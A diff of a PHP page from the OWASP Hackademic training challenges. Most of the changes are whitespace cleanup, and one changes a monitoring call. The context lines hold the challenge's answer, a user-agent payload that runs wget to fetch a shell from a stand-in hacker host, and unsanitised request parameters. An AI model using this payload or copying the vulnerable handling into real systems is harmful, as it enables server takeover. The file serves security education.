@@ -1,15 +1,15 @@
 <?php
 
-/** 
+/**
  *    ----------------------------------------------------------------
  *    OWASP Hackademic Challenges Project
  *    ----------------------------------------------------------------
- *    Copyright (C) 2010-2011 
+ *    Copyright (C) 2010-2011
  *   	  Andreas Venieris [venieris@owasp.gr]
  *   	  Anastasios Stasinopoulos [anast@owasp.gr]
  *    ----------------------------------------------------------------
  */
- 
+
 ?>
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
 <html>
@@ -45,11 +45,11 @@ One of their most important attacks was when they tampered with the data stored 
 error_reporting(0);
 $shiz = $_REQUEST['source'];
 $page = $_REQUEST['page'];
-			include_once dirname(__FILE__).'/../../init.php';		
+			include_once dirname(__FILE__).'/../../init.php';
 			session_start();
 			require_once(HACKADEMIC_PATH."pages/challenge_monitor.php");
-			$monitor->update(CHALLENGE_INIT,$_GET['user'],$_GET['id'],$_GET['token']);
- 
+			$monitor->update(CHALLENGE_INIT,$_GET);
+
 if((!isset($shiz)) && (!isset($page))){
      echo '
 	 <html>
@@ -71,7 +71,7 @@ if((!isset($shiz)) && (!isset($page))){
 }else{
 	if ($page == "answer.php"){
 		 	//$ua = $_SERVER['HTTP_USER_AGENT'];
-			
+
 			$lfi = '<?system("wget http://www.really_nasty_hacker.com/shell.txt");?>';
 			if ($_SERVER['HTTP_USER_AGENT'] === $lfi)
 			{
@@ -82,13 +82,13 @@ if((!isset($shiz)) && (!isset($page))){
 			//{
 			//	echo "&#932;&#959; backdoor shell &#949;&#947;&#954;&#945;&#964;&#945;&#963;&#964;&#940;&#952;&#951;&#954;&#949; &#949;&#960;&#953;&#964;&#965;&#967;&#974;&#962; &#963;&#964;&#959; &#963;&#964;&#972;&#967;&#959;.<br>&#915;&#953;&#945; &#955;&#972;&#947;&#959;&#965;&#962; &#945;&#963;&#966;&#945;&#955;&#949;&#943;&#945;&#962; (&#960;&#945;&#961;&#940; &#964;&#951;&#957; &#959;&#957;&#959;&#956;&#945;&#963;&#943;&#945; &#960;&#959;&#965; &#964;&#959;&#965; &#948;&#974;&#963;&#945;&#964;&#949;) &#956;&#949;&#964;&#959;&#957;&#959;&#956;&#940;&#963;&#964;&#951;&#954;&#949; 			&#945;&#965;&#964;&#972;&#956;&#945;&#964;&#945; <font color=red>tyj0rL.php</font>";
 			//}
-			else 
+			else
 			{
 			        $monitor->update(CHALLENGE_FAILURE);
 				echo '<font face="arial" size="3">The registration of your comment was completed with success!<br> In order to be "viewable" should first becomes acceptable from the administration team of the SlagOFF.com';
 			}
 	}
-		
+
 
 }
 
